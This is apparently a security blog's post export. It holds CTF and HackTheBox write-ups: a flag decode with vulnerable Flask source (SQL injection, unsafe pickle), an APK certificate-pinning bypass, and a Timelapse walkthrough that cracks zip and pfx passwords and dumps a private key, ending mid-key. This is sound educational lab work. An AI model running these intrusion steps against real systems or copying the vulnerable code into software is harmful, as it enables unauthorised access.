/WC1NQVN7M0xmX0h1TTRuX1IzNTB1ckMzNV93MWxMXzgzX0Mwbjc0QzcxTjlfWTB1XzUwMG59 502 Bad Gateway ... $ echo WC1NQVN7M0xmX0h1TTRuX1IzNTB1ckMzNV93MWxMXzgzX0Mwbjc0QzcxTjlfWTB1XzUwMG59 | base64 -d                                                             X-MAS{3Lf_HuM4n_R350urC35_w1lL_83_C0n74C71N9_Y0u_500n}   Flag     X-MAS{3Lf_HuM4n_R350urC35_w1lL_83_C0n74C71N9_Y0u_500n}   Extra miles Vulnerable source code import base64 import dataclasses import os import pickle import sqlite3 from typing import Optional  from flask import Flask, render_template   @dataclasses.dataclass class Elf: \tname: str \tactivity: str \tid: Optional[int] = dataclasses.field(default=None)   app = Flask(__name__)  db = sqlite3.connect('file::memory:?cache=shared', check_same_thread=False)   @app.route(\"/\") def index() - str: \tcursor = db.execute(\"select id, data from elves\") \telves = [] \tfor record in cursor: \t\telf = pickle.loads(base64.b64decode(record[1])) \t\telf.id = record[0] \t\telves.append(elf) \treturn render_template(\"index.html\", elves=elves)   @app.route(\"/&lt;elf_id&gt;\") def elf_data(elf_id: int) - str: \tcursor = db.execute(f\"select data from elves where id = {elf_id}\") \tdata = cursor.fetchone()[0] \telf = pickle.loads(base64.b64decode(data)) \treturn render_template('elf.html', elf=elf)   def main(): \tdb.execute(\"\"\" \t\tcreate table elves( \t\t\tid integer primary key autoincrement not null, \t\t\tdata text \t\t); \t\"\"\") \tfor elf in [ \t\tElf(name=\"Snowflake\", activity=\"Packing gifts\"), \t\tElf(name=\"Bell\", activity=\"Helping Santa\"), \t\tElf(name=\"Snowy\", activity=\"Looking at the naughty list\") \t]: \t\tdata = base64.b64encode(pickle.dumps(elf)) \t\tdb.execute(f\"\"\" \t\t\tinsert into elves(data) values(?); \t\t\"\"\", (data,)) \tapp.run('0.0.0.0', 2000)   if __name__ == \"__main__\": \tmain()"
  },
  
  {
    "title": "0xbro, from developer to pentester (Beyond technology, Ep. 01)",
    "url": "/posts/oltre-la-tecnologia_da-programmatore-a-pentester/",
    "categories": "Articles & Writeups, InfoSec Education",
    "tags": "podcast, interview",
    "date": "2022-11-01 00:00:00 +0100",
    "content": "Introduction A few days ago, a video was released on my friend Leonardo Tamiano‚Äôs channel in which we had a nice conversation about our school and work career, various IT security issues and many other topics. Please feel free to give a listen and maybe some feedback (sorry but the podcast is in Italian language only)!  Video   Timestamp  TIMESTAMPS: 00:00:00 - Introduction 00:01:45 - Who is Mattia (0xbro) Brollo? 00:04:36 - Is college/university always necessary? 00:16:47 - The role of high schools 00:21:25 - University or work? 00:22:30 - From developer to pentester 00:28:40 - The usual question, ‚Äúhow do I become a hackerz?‚Äù 00:34:27 - Why it is important to use your own knowledge 00:41:50 - The main technological contexts of pentests 00:45:37 - Pentest, mainly black-box or white-box? 00:53:00 - The conflict between programmers and pentesters 00:56:00 - Why did you start making videos? 01:01:00 - How did you learn English? 01:08:50 - The importance of hackmeetings and community"
  },
  
  {
    "title": "Intercept HTTPS on non-rooted Android devices",
    "url": "/posts/intercept-https-on-non-rooted-devices/",
    "categories": "Articles & Writeups, Android",
    "tags": "hackthebox, android",
    "date": "2022-09-20 00:00:00 +0200",
    "content": "Introduction In this HackTheBox challenge, named Anchored, we reverse engineer and patch an APK to bypass certificate pinning to be able to intercept application requests on non-rooted Android devices.  Improved skills    Disassemble APK   Decompile .dex file   Reverse Engineering Android applications   Bypass certificate pinning security implementations (network_security_config.xml)   Used tools    APKTool   jadx   jd-gui   Burpsuite   Video   Notes AndroidManifest.xml AndroidManifest.xml do not present the minSdkVersion field, allowing to install the application on any desired Android version: &lt;?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"no\"?&gt;&lt;manifest xmlns:android=\"http://schemas.android.com/apk/res/android\" android:compileSdkVersion=\"31\" android:compileSdkVersionCodename=\"12\" package=\"com.example.anchored\" platformBuildVersionCode=\"31\" platformBuildVersionName=\"12\"&gt;     &lt;uses-permission android:name=\"android.permission.INTERNET\"/&gt;     &lt;application android:allowBackup=\"true\" android:appComponentFactory=\"androidx.core.app.CoreComponentFactory\" android:icon=\"@mipmap/ic_launcher\" android:label=\"@string/app_name\" android:networkSecurityConfig=\"@xml/network_security_config\" android:roundIcon=\"@mipmap/ic_launcher_round\" android:supportsRtl=\"true\" android:theme=\"@style/Theme.Anchored\"&gt;         &lt;activity android:exported=\"true\" android:name=\"com.example.anchored.MainActivity\"&gt;             &lt;intent-filter&gt;                 &lt;action android:name=\"android.intent.action.MAIN\"/&gt;                 &lt;category android:name=\"android.intent.category.LAUNCHER\"/&gt;             &lt;/intent-filter&gt;         &lt;/activity&gt;     &lt;/application&gt; &lt;/manifest&gt;   Patched the network_security_config.xml Added row 6 and 7 to the original file: $ bat res/xml/network_security_config.xml  ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ        ‚îÇ File: res/xml/network_security_config.xml        ‚îÇ Size: 403 B ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ    1   ‚îÇ &lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;    2   ‚îÇ &lt;network-security-config&gt;    3   ‚îÇ     &lt;domain-config cleartextTrafficPermitted=\"false\"&gt;    4   ‚îÇ         &lt;domain includeSubdomains=\"true\"&gt;anchored.com&lt;/domain&gt;    5   ‚îÇ         &lt;trust-anchors&gt;    6   ‚îÇ         &lt;certificates src=\"system\" /&gt;    7   ‚îÇ         &lt;certificates src=\"user\" overridePins=\"true\" /&gt;    8   ‚îÇ         &lt;certificates src=\"@raw/certificate\" /&gt;    9   ‚îÇ         &lt;/trust-anchors&gt;   10   ‚îÇ     &lt;/domain-config&gt;   11   ‚îÇ &lt;/network-security-config&gt; ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ   Generated the key and signed the patched APK:  $ keytool -genkey -v -keystore test.keystore -alias Test -keyalg RSA -keysize 1024 -sigalg SHA1withRSA -validity 10000 Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true Enter keystore password: Re-enter new password:  What is your first and last name?   [Unknown]:  0xbro What is the name of your organizational unit?   [Unknown]:  maoutis What is the name of your organization?   [Unknown]: What is the name of your City or Locality?   [Unknown]: What is the name of your State or Province?   [Unknown]: What is the two-letter country code for this unit?   [Unknown]: Is CN=0xbro, OU=maoutis, O=Unknown, L=Unknown, ST=Unknown, C=Unknown correct?   [no]:  yes  Generating 1,024 bit RSA key pair and self-signed certificate (SHA1withRSA) with a validity of 10,000 days         for: CN=0xbro, OU=maoutis, O=Unknown, L=Unknown, ST=Unknown, C=Unknown [Storing test.keystore]  Warning: The generated certificate uses the SHA1withRSA signature algorithm which is considered a security risk. This algorithm will be disabled in a future update. The generated certificate uses a 1024-bit RSA key which is considered a security risk. This key size will be disabled in a future update.  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/Anchored/apktool/Anchored/dist] ‚îî‚îÄ$ jarsigner -keystore test.keystore Anchored.apk -sigalg SHA1withRSA -digestalg SHA1 Test Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true Enter Passphrase for keystore: jar signed.  Warning: The signer's certificate is self-signed. The SHA1 algorithm specified for the -digestalg option is considered a security risk. This algorithm will be disabled in a future update. The SHA1withRSA algorithm specified for the -sigalg option is considered a security risk. This algorithm will be disabled in a future update. The RSA signing key has a keysize of 1024 which is considered a security risk. This key size will be disabled in a future update.  $ adb install Anchored.apk               Performing Streamed Install Success   External resources    Intercepting HTTPS on Android   Intercepting Android HTTP   Network security configuration   How to use frida on a non-rooted device   Using Frida on Android without root"
  },
  
  {
    "title": "HackTheBox - Timelapse",
    "url": "/posts/timelapse/",
    "categories": "Articles & Writeups, HackTheBox",
    "tags": "hackthebox",
    "date": "2022-08-20 00:00:00 +0200",
    "content": "Resolution summary     Accessing a public SMB share through a null session it was possible to discover a crypted zip containing a .pfx file   Cracking the .pfx file it was possible to obtain Legacyy‚Äôs private key and certificate, providing a low privilege access to the box using winrm   Local enumeration allowed to discover svc_deploy‚Äôs credentials inside the powershell history file   svc_deploy was able to access credentials contained inside LAPS (Local Administrator Password Solution), discovering the Administrator password   Improved skills     Manage and decrypt .pfx files   Enumerating LAPS (Local Administrator Password Solution)   Used tools     nmap   smbmap   zip2john   pfx2john   john   openssl   evil-winrm     Information Gathering  Scanned all TCP ports:  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/B2R/Timelaps] ‚îî‚îÄ$ sudo nmap -sS -p- 10.10.11.152 -v -oN scan/all-tcp-ports.txt ... Not shown: 65520 filtered tcp ports (no-response) PORT      STATE SERVICE 53/tcp    open  domain 88/tcp    open  kerberos-sec 135/tcp   open  msrpc 139/tcp   open  netbios-ssn 389/tcp   open  ldap 445/tcp   open  microsoft-ds 464/tcp   open  kpasswd5 593/tcp   open  http-rpc-epmap 636/tcp   open  ldapssl 5986/tcp  open  wsmans 9389/tcp  open  adws 49667/tcp open  unknown 49673/tcp open  unknown 49674/tcp open  unknown 49696/tcp open  unknown  Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 156.31 seconds            Raw packets sent: 196694 (8.655MB) | Rcvd: 131 (5.748KB)   Enumerated open TCP ports:  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/B2R/Timelaps] ‚îî‚îÄ$ cat scan/all-tcp-ports.txt | grep open | cut -d '/' -f1 | sed ':a;N;$!ba;s/\\n/,/g' 53,88,135,139,389,445,464,593,636,5986,9389,49667,49673,49674,49696  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/B2R/Timelaps] ‚îî‚îÄ$ sudo nmap -sT -sV -sC -p53,88,135,139,389,445,464,593,636,5986,9389,49667,49673,49674,49696 10.10.11.152 -oN scan/open-tcp-ports.txt Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-08 15:45 EDT Nmap scan report for 10.10.11.152 Host is up (0.064s latency).  PORT      STATE SERVICE       VERSION 53/tcp    open  domain        Simple DNS Plus 88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-05-09 03:45:56Z) 135/tcp   open  msrpc         Microsoft Windows RPC 139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn 389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name) 445/tcp   open  microsoft-ds? 464/tcp   open  kpasswd5? 593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0 636/tcp   open  ldapssl? 5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 | ssl-cert: Subject: commonName=dc01.timelapse.htb | Not valid before: 2021-10-25T14:05:29 |_Not valid after:  2022-10-25T14:25:29 |_ssl-date: 2022-05-09T03:47:26+00:00; +7h59m59s from scanner time. |_http-title: Not Found | tls-alpn: |_  http/1.1 9389/tcp  open  mc-nmf        .NET Message Framing 49667/tcp open  msrpc         Microsoft Windows RPC 49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0 49674/tcp open  msrpc         Microsoft Windows RPC 49696/tcp open  msrpc         Microsoft Windows RPC Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows  Host script results: | smb2-time: |   date: 2022-05-09T03:46:50 |_  start_date: N/A | smb2-security-mode: |   3.1.1: |_    Message signing enabled and required |_clock-skew: mean: 7h59m58s, deviation: 0s, median: 7h59m58s  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 98.11 seconds   Enumeration  Port 139 &amp; Port 445 - NetBios &amp; SMB  Enumerated anonymous shares:  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/B2R/Timelaps] ‚îî‚îÄ$ smbmap -H 10.10.11.152 -u ' ' [+] Guest session       IP: 10.10.11.152:445    Name: dc01.timelapse.htb         Disk                                                    Permissions     Comment         ----                                                    -----------     -------         ADMIN$                                                  NO ACCESS       Remote Admin         C$                                                      NO ACCESS       Default share         IPC$                                                    READ ONLY       Remote IPC         NETLOGON                                                NO ACCESS       Logon server share         Shares                                                  READ ONLY         SYSVOL                                                  NO ACCESS       Logon server share   Enumerated Shares shared folder:  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/B2R/Timelaps] ‚îî‚îÄ$ smbmap -H 10.10.11.152 -u ' ' -R Shares [+] Guest session       IP: 10.10.11.152:445    Name: dc01.timelapse.htb         Disk                                                    Permissions     Comment         ----                                                    -----------     -------         Shares                                                  READ ONLY         .\\Shares\\*         dr--r--r--                0 Mon Oct 25 11:55:14 2021    .         dr--r--r--                0 Mon Oct 25 11:55:14 2021    ..         dr--r--r--                0 Mon Oct 25 15:40:06 2021    Dev         dr--r--r--                0 Mon Oct 25 11:55:14 2021    HelpDesk         .\\Shares\\Dev\\*         dr--r--r--                0 Mon Oct 25 15:40:06 2021    .         dr--r--r--                0 Mon Oct 25 15:40:06 2021    ..         fr--r--r--             2611 Mon Oct 25 17:05:30 2021    winrm_backup.zip         .\\Shares\\HelpDesk\\*         dr--r--r--                0 Mon Oct 25 11:55:14 2021    .         dr--r--r--                0 Mon Oct 25 11:55:14 2021    ..         fr--r--r--          1118208 Mon Oct 25 11:55:14 2021    LAPS.x64.msi         fr--r--r--           104422 Mon Oct 25 11:55:14 2021    LAPS_Datasheet.docx         fr--r--r--           641378 Mon Oct 25 11:55:14 2021    LAPS_OperationsGuide.docx         fr--r--r--            72683 Mon Oct 25 11:55:14 2021    LAPS_TechnicalSpecification.docx   Downloaded all files:  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/B2R/Timelaps] ‚îî‚îÄ$ sudo smbmap -R Shares -H dc01.timelapse.htb -A . -u ' ' [+] Guest session       IP: dc01.timelapse.htb:445      Name: unknown [+] Starting search for files matching '.' on share Shares. [+] Match found! Downloading: Shares\\Dev\\winrm_backup.zip [+] Match found! Downloading: Shares\\HelpDesk\\LAPS.x64.msi [+] Match found! Downloading: Shares\\HelpDesk\\LAPS_Datasheet.docx [+] Match found! Downloading: Shares\\HelpDesk\\LAPS_OperationsGuide.docx [+] Match found! Downloading: Shares\\HelpDesk\\LAPS_TechnicalSpecification.docx  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/B2R/Timelaps/loot] ‚îî‚îÄ$ ls -al total 1916 drwxr-xr-x 2 kali kali    4096 May  8 16:17 . drwxr-xr-x 5 kali kali    4096 May  8 16:02 .. -rw-r--r-- 1 root root    2611 May  8 16:03 dc01.timelapse.htb-Shares_Dev_winrm_backup.zip -rw-r--r-- 1 root root  104422 May  8 16:03 dc01.timelapse.htb-Shares_HelpDesk_LAPS_Datasheet.docx -rw-r--r-- 1 root root  641378 May  8 16:03 dc01.timelapse.htb-Shares_HelpDesk_LAPS_OperationsGuide.docx -rw-r--r-- 1 root root   72683 May  8 16:03 dc01.timelapse.htb-Shares_HelpDesk_LAPS_TechnicalSpecification.docx -rw-r--r-- 1 root root 1118208 May  8 16:03 dc01.timelapse.htb-Shares_HelpDesk_LAPS.x64.msi   Cracked the password protected zip file:  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/B2R/Timelaps/loot] ‚îî‚îÄ$ zip2john dc01.timelapse.htb-Shares_Dev_winrm_backup.zip &gt; zip.hash  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/B2R/Timelaps/loot] ‚îî‚îÄ$ john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt --fork=5 Using default input encoding: UTF-8 Loaded 1 password hash (PKZIP [32/64]) Node numbers 1-5 of 5 (fork) Press 'q' or Ctrl-C to abort, almost any other key for status supremelegacy    (dc01.timelapse.htb-Shares_Dev_winrm_backup.zip/legacyy_dev_auth.pfx) 5 1g 0:00:00:00 DONE (2022-05-08 16:19) 8.333g/s 5781Kp/s 5781Kc/s 5781KC/s supsid..supravit 4 0g 0:00:00:00 DONE (2022-05-08 16:19) 0g/s 6236Kp/s 6236Kc/s 6236KC/s    1990   .ie168 2 0g 0:00:00:00 DONE (2022-05-08 16:19) 0g/s 6103Kp/s 6103Kc/s 6103KC/s  _ 09..*7¬°Vamos! 3 0g 0:00:00:00 DONE (2022-05-08 16:19) 0g/s 5976Kp/s 5976Kc/s 5976KC/s  08 22 0128..xCvBnM, 1 0g 0:00:00:00 DONE (2022-05-08 16:19) 0g/s 5854Kp/s 5854Kc/s 5854KC/s  green1day.a6_123 Waiting for 4 children to terminate Session completed.  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/B2R/Timelaps/loot] ‚îî‚îÄ$ unzip dc01.timelapse.htb-Shares_Dev_winrm_backup.zip Archive:  dc01.timelapse.htb-Shares_Dev_winrm_backup.zip [dc01.timelapse.htb-Shares_Dev_winrm_backup.zip] legacyy_dev_auth.pfx password:   inflating: legacyy_dev_auth.pfx  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/B2R/Timelaps/loot] ‚îî‚îÄ$ file legacyy_dev_auth.pfx legacyy_dev_auth.pfx: data    üõà The .pfx file, which is in a PKCS#12 format, contains the SSL certificate (public keys) and the corresponding private keys. Sometimes, you might have to import the certificate and private keys separately in an unencrypted plain text format to use it on another system. This topic provides instructions on how to convert the .pfx file to .crt and .key files.   Extract .crt and .key files from .pfx file:  Extracting the certificate and keys from a .pfx file  Cracking .pfx to get encryption password:  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/B2R/Timelaps/loot] ‚îî‚îÄ$ pfx2john legacyy_dev_auth.pfx &gt; pfx.hash  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/B2R/Timelaps/loot] ‚îî‚îÄ$ john pfx.hash --wordlist=/usr/share/wordlists/rockyou.txt --fork=5 Using default input encoding: UTF-8 Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 128/128 AVX 4x]) Cost 1 (iteration count) is 2000 for all loaded hashes Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes Node numbers 1-5 of 5 (fork) Press 'q' or Ctrl-C to abort, almost any other key for status 1 0g 0:00:01:32 17.66% (ETA: 16:41:22) 0g/s 5981p/s 5981c/s 5981C/s wilderalberto..wildeana 3 0g 0:00:01:32 19.39% (ETA: 16:40:36) 0g/s 6508p/s 6508c/s 6508C/s ujusthatin..ujpest14 2 0g 0:00:01:32 20.52% (ETA: 16:40:10) 0g/s 6854p/s 6854c/s 6854C/s todopeluche..todolopuedo25 4 0g 0:00:01:32 20.48% (ETA: 16:40:11) 0g/s 6842p/s 6842c/s 6842C/s toldme17..tolbert85 5 0g 0:00:01:31 20.59% (ETA: 16:40:05) 0g/s 6877p/s 6877c/s 6877C/s tmnme575..tmn388 thuglegacy       (legacyy_dev_auth.pfx) 5 1g 0:00:01:34 DONE (2022-05-08 16:34) 0.01061g/s 6857p/s 6857c/s 6857C/s thuglif33..thuging1   Extract .key:  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/B2R/Timelaps/loot] ‚îî‚îÄ$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv.key Enter Import Password: thuglegacy Enter PEM pass phrase: password Verifying - Enter PEM pass phrase: password  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/B2R/Timelaps/loot] ‚îî‚îÄ$ ls -al priv.key -rw------- 1 kali kali 2102 May  8 16:37 priv.key  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/B2R/Timelaps/loot] ‚îî‚îÄ$ cat priv.key Bag Attributes     Microsoft Local Key set: &lt;No Values&gt;     localKeyID: 01 00 00 00     friendlyName: te-4a534157-c8f1-4724-8db6-ed12f25c2a9b     Microsoft CSP Name: Microsoft Software Key Storage Provider Key Attributes     X509v3 Key Usage: 90 -----BEGIN ENCRYPTED PRIVATE KEY----- MIIFHDBOBgkqhkiG9w0BBQ0wQTApBgkqhkiG9w0BBQwwHAQIdsBhE6kdp/cCAggA MAwGCCqGSIb3DQIJBQAwFAYIKoZIhvcNAwcECPN/YhO6zuZ0BIIEyMkQ7It0Ujld 0ary1CtsyQFQYBX1ZJPKn043oUyLj98Ln5IffVB5NqO9ftW6vjf/BVoxLnTv4bxO KxA2S4eKtqTW3vf0S6ISmPzTxcNzteA3LudzyXCUYBBDA/c4pfnBwKXkiKa0ALGI 4fTlMLaAA7chhkfiLPwXG974npMGgVZGpYH9M3+40kCTodWjumBWaOBPdl8nBaSp Sdil2UkxfLkd6V9Mmpm2327hzinAelMhlmFkpt0UL54/Jh7G1+x+EtsfQsIX3FP+ bia4RoLVpqfMaTBqr6WvwVHFOwBD122Mrs6ZBZ/PelxOZwREU5DTCJ1tLzLKYfsh DkrGtgeNKuqJEe6Yh9u4VH8BlRPqUTCotuOORb6BpcTARNcRxpbMIDr1oa2afN2e ElCzNKeBqmNabdFY+KjHPbz6JKGFSHVs1i7buHecWPrsiDmpwc8XNNURvg1m3d+x J08DHuzEKihM3zEOdBqprZ20bQzEkBeUPraDwzIiIeu8VbApkXwkth2m81DjiCIk r04R4dgNoyBzXXDBpIsd4dDLJEue4r/flNe3r0ruf43vhcdtN9euq6n92NxeodJw BXe1MHtBbye3yOALRVnnin4BZ+vBb1dNrbFZZCNJR3N8FHhOnnbhChKbkGrcxgXw oUKXPBpctCRm4UdL06fbPlghuFA/67B/NqzLOIkdYDhJpyhjHc0lIXwwyStxCAHd HEu9RKhLy5Ao6CraNwarND+SFYiXT6l/s+9P9lgtNlGIlXuveZZwlI/mDIfzWyla 79j2qqJWdIdA21JWEQ0KxC6x+fsRa0CARvnlhI7JZGSKh7kfBFFzoU0AxwbnCWsF TwVXPYrvGa3AKDUcDwwCR+AcW6Q0i/umqJ8zNYPASbIpmGmCXitl5cC3Tp4KkTnR 9KvEg+wcTX8hCk0vzituzWrDe7IYY9K3Qrsn21NP2pauQurLwdIw5ByIRry1iwps EPKS+Au8aEaAQrzR5sz4P8tcMrRSkc/P8Ig843qwQMfgdgt+k9K5f7+xOdgJdqGv y5eVwKyCodtiI/XbGtJOquZHZDacWbEMyBCZeRJMVe59M6HogNrWoetEbojtVqBX kgRdHVVoN3F4c5knjGvVoek7wfptRWOcgrVAIEDjupQbfiqpMht76OdnwsRiEOSO 